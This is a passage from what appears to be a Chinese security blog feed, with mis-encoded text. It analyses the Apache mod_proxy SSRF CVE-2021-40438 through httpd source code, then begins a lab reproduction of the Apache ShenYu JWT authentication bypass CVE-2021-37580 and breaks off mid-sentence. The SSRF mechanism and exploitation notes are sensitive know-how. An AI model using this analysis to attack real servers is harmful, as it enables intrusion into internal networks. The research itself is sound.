Handlerï¼Œæˆ‘ä»¬ä»è¿™ä¸ªå‡½æ•°æ¥çœ‹å“ªäº›æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œå½“ç„¶ï¼Œè®¤çœŸçœ‹äº†ä¸Šéƒ¨åˆ†å†…å®¹çš„ä½ ï¼Œä¸€å®šçŸ¥é“ <code>r-&gt;filename</code> æ˜¯å…³é”®ã€‚</p><p>modules/proxy/mod_proxy_http.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ap_proxy_http_register_hook</span><span class="params">(<span class="keyword">apr_pool_t</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ap_hook_post_config(proxy_http_post_config, <span class="literal">NULL</span>, <span class="literal">NULL</span>, APR_HOOK_MIDDLE);</span><br><span class="line">    proxy_hook_scheme_handler(proxy_http_handler, <span class="literal">NULL</span>, <span class="literal">NULL</span>, APR_HOOK_FIRST);</span><br><span class="line">    proxy_hook_canon_handler(proxy_http_canon, <span class="literal">NULL</span>, <span class="literal">NULL</span>, APR_HOOK_FIRST);</span><br><span class="line">    warn_rx = ap_pregcomp(p, <span class="string">&quot;[0-9]&#123;3&#125;[ \t]+[^ \t]+[ \t]+\&quot;[^\&quot;]*\&quot;([ \t]+\&quot;([^\&quot;]+)\&quot;)?&quot;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ª hookï¼Œæˆ‘ä»¬æ¥çœ‹ <code>proxy_http_canon</code> è¿™ä¸ª Handlerï¼Œæ˜¯ç”¨äºå¤„ç†åä»£è¯·æ±‚çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">proxy_http_canon</span><span class="params">(request_rec *r, <span class="keyword">char</span> *url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get_url_scheme æ˜¯æ£€æŸ¥è¯¥è¯·æ±‚æ˜¯å¦æ˜¯ï¼ˆh / H å¼€å¤´ï¼‰ å†åˆ¤æ–­æ˜¯å¦æ˜¯ http / httpsï¼Œä¹Ÿå°±æ˜¯è¯¥ä¸è¯¥ç”± mod_proxy_http å¤„ç†</span></span><br><span class="line">    <span class="comment">// schema pass</span></span><br><span class="line">    scheme = get_url_scheme((<span class="keyword">const</span> <span class="keyword">char</span> **)&amp;url, &amp;is_ssl);</span><br><span class="line">    <span class="keyword">if</span> (!scheme) &#123;</span><br><span class="line">        <span class="keyword">return</span> DECLINED;</span><br><span class="line">    &#125;</span><br><span class="line">    port = def_port = (is_ssl) ? DEFAULT_HTTPS_PORT : DEFAULT_HTTP_PORT;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (r-&gt;proxyreq) &#123;</span><br><span class="line">    <span class="keyword">default</span>: <span class="comment">/* wtf are we doing here? */</span></span><br><span class="line">    <span class="keyword">case</span> PROXYREQ_REVERSE:</span><br><span class="line">        <span class="keyword">if</span> (apr_table_get(r-&gt;notes, <span class="string">&quot;proxy-nocanon&quot;</span>)) &#123;</span><br><span class="line">            path = url;   <span class="comment">/* this is the raw path */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            path = ap_proxy_canonenc(r-&gt;pool, url, <span class="built_in">strlen</span>(url),</span><br><span class="line">                                     enc_path, <span class="number">0</span>, r-&gt;proxyreq);</span><br><span class="line">            search = r-&gt;args;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> PROXYREQ_PROXY:</span><br><span class="line">        path = url;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (path == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> HTTP_BAD_REQUEST;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (port != def_port)</span><br><span class="line">        apr_snprintf(sport, <span class="keyword">sizeof</span>(sport), <span class="string">&quot;:%d&quot;</span>, port);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        sport[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// host pass</span></span><br><span class="line">    <span class="keyword">if</span> (ap_strchr_c(host, <span class="string">&#x27;:&#x27;</span>)) &#123; <span class="comment">/* if literal IPv6 address */</span></span><br><span class="line">        host = apr_pstrcat(r-&gt;pool, <span class="string">&quot;[&quot;</span>, host, <span class="string">&quot;]&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æœ€ç»ˆæ‹¼æ¥èµ‹å€¼ç»™ r-&gt;filename</span></span><br><span class="line">    r-&gt;filename = apr_pstrcat(r-&gt;pool, <span class="string">&quot;proxy:&quot;</span>, scheme, <span class="string">&quot;://&quot;</span>, host, sport,</span><br><span class="line">                              <span class="string">&quot;/&quot;</span>, path, (search) ? <span class="string">&quot;?&quot;</span> : <span class="string">&quot;&quot;</span>, search, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“åˆæ³¨é‡Šï¼Œå¯ä»¥çœ‹åˆ°æœ€ç»ˆåªæœ‰ <code>path</code> å’Œ <code>search</code> æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œ<code>r-&gt;filename</code> ååŠéƒ¨åˆ†å¯æ§ä¹Ÿæ°æ°æ˜¯ <code>|</code> åçš„åç«¯åœ°å€ã€‚</p><h4 id="UDS-è§£æè¿‡ç¨‹"><a href="#UDS-è§£æè¿‡ç¨‹" class="headerlink" title="UDS è§£æè¿‡ç¨‹"></a>UDS è§£æè¿‡ç¨‹</h4><p>ä¹‹å‰åœ¨ä»£ç æ³¨é‡Šä¸­ä¹Ÿæåˆ°è¿‡ï¼Œ<code>uds_path</code> å°±æ˜¯ <code>unix:</code> ä¸ <code>|</code> ä¹‹é—´çš„éƒ¨åˆ†ï¼Œåœ¨ poc ä¸­å°±æ˜¯é‚£è¿‘ 7000 çš„å­—ç¬¦ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *sockpath = ap_runtime_dir_relative(r-&gt;pool, urisock.path);</span><br><span class="line"><span class="comment">// å°† uds_path é”®å€¼å¯¹æ·»åŠ åˆ° r-&gt;notes</span></span><br><span class="line">apr_table_setn(r-&gt;notes, <span class="string">&quot;uds_path&quot;</span>, sockpath);</span><br></pre></td></tr></table></figure><p>å…ˆæ¥çœ‹ <code>ap_runtime_dir_relative</code> åšäº†ä»€ä¹ˆã€‚</p><p>server/config.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ap_runtime_dir_relative(r-&gt;pool, urisock.path)</span></span><br><span class="line">AP_DECLARE(<span class="keyword">char</span> *) ap_runtime_dir_relative(<span class="keyword">apr_pool_t</span> *p, <span class="keyword">const</span> <span class="keyword">char</span> *file)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *newpath = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">apr_status_t</span> rv;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *runtime_dir = ap_runtime_dir ? ap_runtime_dir : ap_server_root_relative(p, DEFAULT_REL_RUNTIMEDIR);</span><br><span class="line"></span><br><span class="line">    rv = apr_filepath_merge(&amp;newpath, runtime_dir, file,</span><br><span class="line">                            APR_FILEPATH_TRUENAME, p);</span><br><span class="line">    <span class="keyword">if</span> (newpath &amp;&amp; (rv == APR_SUCCESS || APR_STATUS_IS_EPATHWILD(rv)</span><br><span class="line">                                      || APR_STATUS_IS_ENOENT(rv)</span><br><span class="line">                                      || APR_STATUS_IS_ENOTDIR(rv))) &#123;</span><br><span class="line">        <span class="keyword">return</span> newpath;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è°ƒç”¨äº† apr åº“çš„ <code>apr_filepath_merge</code> è¿™ä¸ªå‡½æ•°ã€‚</p><p>apr/file_io/unix/filepath.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// apr_filepath_merge(&amp;newpath, runtime_dir, file,APR_FILEPATH_TRUENAME, p)</span></span><br><span class="line">APR_DECLARE(<span class="keyword">apr_status_t</span>) apr_filepath_merge(<span class="keyword">char</span> **newpath,</span><br><span class="line">                                             <span class="keyword">const</span> <span class="keyword">char</span> *rootpath,</span><br><span class="line">                                             <span class="keyword">const</span> <span class="keyword">char</span> *addpath,</span><br><span class="line">                                             <span class="keyword">apr_int32_t</span> flags,</span><br><span class="line">                                             <span class="keyword">apr_pool_t</span> *p)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    rootlen = <span class="built_in">strlen</span>(rootpath);</span><br><span class="line">    maxlen = rootlen + <span class="built_in">strlen</span>(addpath) + <span class="number">4</span>; <span class="comment">/* 4 for slashes at start, after</span></span><br><span class="line"><span class="comment">                                             * root, and at end, plus trailing</span></span><br><span class="line"><span class="comment">                                             * null */</span></span><br><span class="line">    <span class="keyword">if</span> (maxlen &gt; APR_PATH_MAX) &#123;</span><br><span class="line">        <span class="keyword">return</span> APR_ENAMETOOLONG;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>apr_filepath_merge</code> è¿™ä¸ªå‡½æ•°ç®€å•æè¿°å°±æ˜¯å°† <code>addpath</code> åˆå¹¶åˆ°é¢„å…ˆå¤„ç†çš„ <code>rootpath</code> ä¸Šï¼Œåœ¨è¿™é‡Œå°±æ˜¯ <code>file</code> åˆå¹¶åˆ° <code>runtime_dir</code> ã€‚</p><p>å¯¹çœç•¥çš„éƒ¨åˆ†è§£é‡Šä¸€ä¸‹ï¼Œè¿™é‡Œçš„ <code>flags</code> å› ä¸ºæ˜¯ <code>APR_FILEPATH_TRUENAME</code>ï¼ˆè¿™æ˜¯åˆå¹¶çš„è§„åˆ™ï¼‰ï¼Œæµç¨‹å¤§æ¦‚å°±æ˜¯æ£€æŸ¥ <code>file</code> è¿™ä¸ª <code>addpath</code> æ˜¯å¦åŒ…å«ä¸€äº›å¹³å°ä¸æ”¯æŒçš„é€šé…ç¬¦ï¼ˆ <code>*</code> ã€<code>?</code>ï¼‰ï¼Œå…¶ä»–æƒ…å†µæ˜¯å¤„ç†ç»å¯¹ / ç›¸å¯¹è·¯å¾„çš„ä¸€äº›è§„åˆ™ã€‚</p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆªå–å‡ºæ¥çš„éƒ¨åˆ†ï¼Œå¦‚æœ <code>maxlen</code> ä¹Ÿå°±æ˜¯ <code>rootpath</code> å’Œ <code>addpath</code> é•¿åº¦ + 4 å¦‚æœå¤§äº <code>APR_PATH_MAX</code>ï¼ˆ linux ä¸ win ä¸åŒï¼Œæ˜¯4096ï¼‰ï¼Œå°±ä¼šè¿”å›ä¸€ä¸ª <code>APR_ENAMETOOLONG</code> çš„é”™è¯¯ï¼Œè¿™ä¸ªé”™è¯¯èµ‹å€¼ç»™ <code>rv</code> ï¼Œåœ¨ <code>ap_runtime_dir_relative</code> ä¸­æ˜¯æœ€åä¼šè¿›å…¥ else åˆ†æ”¯ <strong>return NULL</strong> çš„ã€‚</p><p>ä¹‹ååœ¨ modules/proxy/proxy_util.c ä¸­ <code>ap_proxy_determine_connection</code> ç¡®å®šåç«¯ä¸»æœºåå’Œç«¯å£ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">PROXY_DECLARE(<span class="keyword">int</span>)</span><br><span class="line">ap_proxy_determine_connection(<span class="keyword">apr_pool_t</span> *p, request_rec *r,</span><br><span class="line">                              proxy_server_conf *conf,</span><br><span class="line">                              proxy_worker *worker,</span><br><span class="line">                              proxy_conn_rec *conn,</span><br><span class="line">                              <span class="keyword">apr_uri_t</span> *uri,</span><br><span class="line">                              <span class="keyword">char</span> **url,</span><br><span class="line">                              <span class="keyword">const</span> <span class="keyword">char</span> *proxyname,</span><br><span class="line">                              <span class="keyword">apr_port_t</span> proxyport,</span><br><span class="line">                              <span class="keyword">char</span> *server_portstr,</span><br><span class="line">                              <span class="keyword">int</span> server_portstr_size)</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">        </span><br><span class="line">    <span class="comment">// è¿™é‡Œæ˜¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Ÿ</span></span><br><span class="line">    <span class="comment">// è¿˜è®°å¾—ä¹‹å‰æœ‰è¿™å¥ apr_table_setn(r-&gt;notes, &quot;uds_path&quot;, sockpath); å°† uds_path é”®å€¼å¯¹æ·»åŠ åˆ° r-&gt;notes å—ï¼Ÿ</span></span><br><span class="line">    <span class="comment">// è¿™é‡Œå°±æ˜¯åœ¨æ£€éªŒ uds_path çš„å€¼</span></span><br><span class="line">    uds_path = (*worker-&gt;s-&gt;uds_path ? worker-&gt;s-&gt;uds_path : apr_table_get(r-&gt;notes, <span class="string">&quot;uds_path&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (uds_path) &#123;</span><br><span class="line">        <span class="keyword">if</span> (conn-&gt;uds_path == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">/* use (*conn)-&gt;pool instead of worker-&gt;cp-&gt;pool to match lifetime */</span></span><br><span class="line">            conn-&gt;uds_path = apr_pstrdup(conn-&gt;pool, uds_path);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (conn-&gt;uds_path) &#123;</span><br><span class="line">            ap_log_rerror(APLOG_MARK, APLOG_DEBUG, <span class="number">0</span>, r, APLOGNO(<span class="number">02545</span>)</span><br><span class="line">                         <span class="string">&quot;%s: has determined UDS as %s&quot;</span>,</span><br><span class="line">                         uri-&gt;scheme, conn-&gt;uds_path);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* should never happen */</span></span><br><span class="line">            ap_log_rerror(APLOG_MARK, APLOG_DEBUG, <span class="number">0</span>, r, APLOGNO(<span class="number">02546</span>)</span><br><span class="line">                         <span class="string">&quot;%s: cannot determine UDS (%s)&quot;</span>,</span><br><span class="line">                         uri-&gt;scheme, uds_path);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * In UDS cases, some structs are NULL. Protect from de-refs</span></span><br><span class="line"><span class="comment">         * and provide info for logging at the same time.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (!conn-&gt;addr) &#123;</span><br><span class="line">            <span class="keyword">apr_sockaddr_t</span> *sa;</span><br><span class="line">            apr_sockaddr_info_get(&amp;sa, <span class="literal">NULL</span>, APR_UNSPEC, <span class="number">0</span>, <span class="number">0</span>, conn-&gt;pool);</span><br><span class="line">            conn-&gt;addr = sa;</span><br><span class="line">        &#125;</span><br><span class="line">        conn-&gt;hostname = <span class="string">&quot;httpd-UDS&quot;</span>;</span><br><span class="line">        conn-&gt;port = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        </span><br><span class="line">        ...</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹ç…§æ³¨é‡Šï¼Œå¦‚æœæˆ‘ä»¬å‘é€è¶…é•¿å­—ç¬¦ï¼Œå¯¼è‡´ <code>uds_path</code> ä¸º <code>NULL</code> çš„è¯ï¼Œå°±ä¼šè¿›å…¥ else åˆ†æ”¯ï¼Œå®ƒä»¬å…·ä½“å¤„ç†å¤§è‡´æ˜¯è¿™æ ·ä¸€ä¸ªæƒ…å†µï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (uds_path) &#123; </span><br><span class="line">    <span class="comment">// Prepare UDS requestâ€¦</span></span><br><span class="line">    <span class="comment">// ç”¨ UDS ç»§ç»­é€šä¿¡</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Prepare standard proxy requestâ€¦</span></span><br><span class="line">    <span class="comment">// è½¬è€Œç”¨ TCP é€šä¿¡</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç»“åˆæ‰€æœ‰å†…å®¹å°±å¯ä»¥çœ‹å‡ºæ¥äº†ï¼Œè¿›å…¥ else åˆ†æ”¯æŠŠè¯·æ±‚æœ€ç»ˆè§£é‡Šæˆäº†æ ‡å‡†ä»£ç†è¯·æ±‚å¦‚ http://<SSRF_TARGET> ï¼Œå°±å¯¼è‡´äº†å¯ä»¥å‘å†…éƒ¨ç½‘ç»œä»»æ„ Apache æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œè¯·æ±‚æ‰§è¡ŒæˆåŠŸï¼ŒSSRF è§¦å‘ã€‚</p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>æœ‰æ—¶ä¼šæŠ¥ 503 çš„é”™è¯¯ï¼Œå¤šè¯•å‡ æ¬¡å°±è¡Œäº†ã€‚</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211215041523606.png" alt="image-20211215041523606" style="zoom:80%;" /><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://cwiki.apache.org/confluence/display/HTTPD/PHP-FPM">PHP-FPM - HTTPD - Apache Software Foundation</a></p><p><a href="https://www.cnblogs.com/xuey/p/10059050.html">PHP äº”å¤§è¿è¡Œæ¨¡å¼ - é›ªå‰‘æ— å½± - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/tssc/p/10255590.html#_label2_0">å…³äºCGIå’ŒFastCGIçš„ç†è§£ - å¤©ç”Ÿå¸…æ‰ - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://www.fujieace.com/php/modes.html">PHPè¿è¡Œæ¨¡å¼æœ‰å“ªå‡ ç§ï¼Ÿ - ä»˜æ°åšå®¢ (fujieace.com)</a></p><p><a href="https://blog.csdn.net/yueyecheshou1980/article/details/106227285/">Apache httpd ä½¿ç”¨ mod_proxy_fcgiçš„æ–¹å¼php-fpm_yueyecheshou1980çš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://www.cnblogs.com/liuxinyustu/articles/10399883.html">APACHE PHPçš„å‡ ç§è¿è¡Œæ–¹å¼ï¼ˆCGI,FASTCGIï¼‰ - liuxinyu123 - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://www.iteye.com/blog/tcspecial-2070075">Fastcgi FastCgiExternalServer mod_proxy - äº‘æ·¡é£æ¸… - ITeyeåšå®¢</a></p><p><a href="https://httpd.apache.org/docs/trunk/mod/mod_proxy.html">mod_proxy - Apache HTTP Server Version 2.5</a></p><p><a href="https://ci.apache.org/projects/httpd/trunk/doxygen/group__APACHE__CORE__CONFIG.html#gaff5ad1f7fa1d04009c2697453324e93e">Apache2: Configuration</a></p><p><a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/developer-modguide.html">Apache ä¸­æ–‡æ–‡æ¡£ - ä¸º Apache HTTP Server 2.4 å¼€å‘æ¨¡å— | Docs4dev</a></p><p><a href="https://baijiahao.baidu.com/s?id=1659476214623211564&wfr=spider&for=pc">PHPè¿è¡Œæ–¹å¼ä»‹ç» (baidu.com)</a></p><p><a href="https://firzen.de/building-a-poc-for-cve-2021-40438">Building a POC for CVE-2021-40438 â€“ Firzens Blog</a></p><p>[<a href="https://koromoon.blogspot.com/2021/12/cve-2021-40438-apache-http-server.html">CVE-2021-40438] Apache HTTP Server mod_proxy SSRF Vulnerability - KOROMOON</a></p><p><a href="https://cydrill.com/owasp/apache-ssrf-an-all-you-can-eat-reverse-proxy/">Apache SSRF: an all-you-can-eat reverse proxy &gt; Cydrill Software Security</a></p><p><a href="https://www.lionic.com/news/2021/12/05/multiple-vulnerabilities-in-recent-apache-web-server/">Multiple Vulnerabilities in recent Apache Web Server | LIONIC-é´»ç’Ÿç§‘æŠ€</a></p><p><a href="https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html#">Apache mod_proxy SSRFï¼ˆCVE-2021-40438ï¼‰çš„ä¸€ç‚¹åˆ†æå’Œå»¶ä¼¸ | ç¦»åˆ«æ­Œ (leavesongs.com)</a></p><p><a href="http://47.98.250.156/2021/10/25/CVE-2021-40438/">CVE-2021-40438 | 0pa9ue</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
          <category> Cä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> Apache </tag>
            
            <tag> mod_proxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-37580 Apache ShenYu JWT è®¤è¯ç¼ºé™·æ¼æ´åˆ†æ</title>
      <link href="/posts/bb793f41/"/>
      <url>/posts/bb793f41/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ–‡ä¸»è¦å‚ç…§ threedr3am å¸ˆå‚…çš„æ–‡ç« è¿›è¡Œå¤ç°ï¼Œå¹¶è‡ªè¡Œæ·»åŠ äº†ä¸€äº›å†…å®¹è¿›è¡Œæ‹“å±•ã€‚</p><p>åŸæ–‡åœ°å€ï¼š<a href="https://articles.zsxq.com/id_crk7w2w1wjwa.html">Apache ShenYu Admin bypass JWT authentication CVE-2021-37580 (zsxq.com)</a></p><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>Apache ShenYu æ˜¯åº”ç”¨äºæ‰€æœ‰å¾®æœåŠ¡åœºæ™¯çš„ï¼Œå¯æ‰©å±•ã€é«˜æ€§èƒ½ã€å“åº”å¼çš„ API ç½‘å…³ã€‚</p><p><a href="https://shenyu.apache.org/zh/">High-performance, multi-protocol, extensible, responsive API Gateway | Apache ShenYu (Incubating)</a></p><h3 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><ol><li>æœ‰é»˜è®¤æ³„éœ²çš„ç­¾åå¯†é’¥ã€‚</li><li>jwt æ²¡æœ‰å¯¹å¯†ç çš„æ ¡éªŒï¼Œåªç”¨äº†ç”¨æˆ·åä¸ key ã€‚</li></ol><h3 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h3><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211120213220155.png" alt="image-20211120213220155" style="zoom:80%;" /><h3 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h3><p><a href="https://github.com/fofapro/vulfocus">fofapro/vulfocus: ğŸš€Vulfocus æ˜¯ä¸€ä¸ªæ¼æ´é›†æˆå¹³å°ï¼Œå°†æ¼æ´ç¯å¢ƒ docker é•œåƒï¼Œæ”¾å…¥å³å¯ä½¿ç”¨ï¼Œå¼€ç®±å³ç”¨ã€‚ (github.com)</a></p><p>å¶ç„¶å‘ç°äº† Vulfocus è¿™ä¸ªæ¼æ´é›†æˆå¹³å°ï¼Œå¯ä»¥<a href="http://vulfocus.fofa.so/">åœ¨çº¿ç½‘ç«™</a>ä¸Šæ³¨å†Œå®Œæˆæ–°æ‰‹çš„ä¸¤ä¸ªé¢˜ç›®å¯åŠ¨ CVE-2021-37580 è¿™ä¸ªæ¼æ´é•œåƒç¯å¢ƒã€‚</p><p>OR</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull vulfocus/apache_shenyu-ce_2021_37580:latest</span><br></pre></td></tr></table></figure><h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><h3 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h3><p>grep ç¿»äº†åŠå¤©ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log -p -1 f78adb2</span><br></pre></td></tr></table></figure><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211120220438845.png" alt="image-20211120220438845"  /><p>å¯ä»¥çœ‹åˆ° 2.4.0 ç‰ˆæœ¬æœ‰ä¸ªé»˜è®¤çš„ jwt ç­¾åå¯†é’¥ï¼Œè¿™æ˜¯æ¼æ´æˆå› 